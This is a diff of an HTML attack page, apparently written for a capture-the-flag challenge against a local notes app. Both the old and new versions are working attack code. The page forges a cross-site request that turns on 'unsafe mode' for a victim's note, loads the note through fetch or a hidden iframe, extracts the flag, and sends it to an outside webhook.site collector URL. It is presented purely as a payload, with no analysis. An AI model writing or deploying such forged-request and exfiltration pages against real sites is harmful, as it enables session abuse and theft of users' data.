@@ -1,32 +1,37 @@
-
+<!DOCTYPE html>
 <html>
-  <body>
+<head>
+    <title>Attack Page</title>
+</head>
+<body>
+    <form id="unsafeForm" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
+        <input type="hidden" name="id" value="1">
+        <input type="hidden" name="enable" value="1">
+    </form>
+    <iframe id="noteFrame" style="display:none;"></iframe>
     <script>
-      // Step 1: Enable Unsafe Mode for the bot's note (id=1)
-      fetch('http://127.0.0.1:7189/prefs/unsafe', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: 'id=1&enable=1',
-        credentials: 'include'  // Include cookies (session)
-      })
-      .then(() => {
-        // Step 2: Fetch the note (now in unsafe mode)
-        fetch('http://127.0.0.1:7189/notes/1', {
-          credentials: 'include'
-        })
-        .then(response => response.text())
-        .then(html => {
-          // Extract the flag from the note content
-          const parser = new DOMParser();
-          const doc = parser.parseFromString(html, 'text/html');
-          const noteContent = doc.querySelector('.note-content').textContent.trim();
-          
-          // Step 3: Exfiltrate the flag to your webhook
-          fetch('https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag=' + encodeURIComponent(noteContent));
-        });
-      });
+        // Submit the form to enable unsafe mode
+        document.getElementById('unsafeForm').submit();
+
+        // After a delay, load the note page in the iframe
+        setTimeout(() => {
+            const iframe = document.getElementById('noteFrame');
+            iframe.src = 'http://127.0.0.1:7189/notes/1';
+
+            // Wait for the iframe to load, then extract the flag
+            iframe.onload = () => {
+                try {
+                    const noteContent = iframe.contentDocument.querySelector('.note-content').innerText;
+                    fetch('https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0', {
+                        method: 'POST',
+                        body: JSON.stringify({ flag: noteContent }),
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                } catch (e) {
+                    console.error('Error extracting flag:', e);
+                }
+            };
+        }, 2000); // Delay to ensure form submission completes
     </script>
-  </body>
+</body>
 </html>
